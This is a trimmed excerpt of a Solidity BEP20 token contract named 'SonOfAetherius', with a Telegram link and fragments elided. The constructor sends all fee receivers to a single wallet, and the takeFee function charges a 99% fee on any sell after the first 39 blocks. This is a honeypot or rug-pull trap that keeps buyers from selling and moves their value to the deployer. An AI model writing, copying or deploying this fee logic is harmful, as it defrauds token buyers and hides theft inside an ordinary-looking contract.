...
Telegram : https://t.me/sonofaetherius
...
contract SonOfAetherius is IBEP20, Auth {
    ...
    string constant _name = "SonOfAetherius";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x6a4fc2F77182a1f33f4f8BcfEF7DCd511A4BB3AA;
        teamFeeReceiver = 0x6a4fc2F77182a1f33f4f8BcfEF7DCd511A4BB3AA;
        utilityFeeReceiver = 0x6a4fc2F77182a1f33f4f8BcfEF7DCd511A4BB3AA;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 39 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
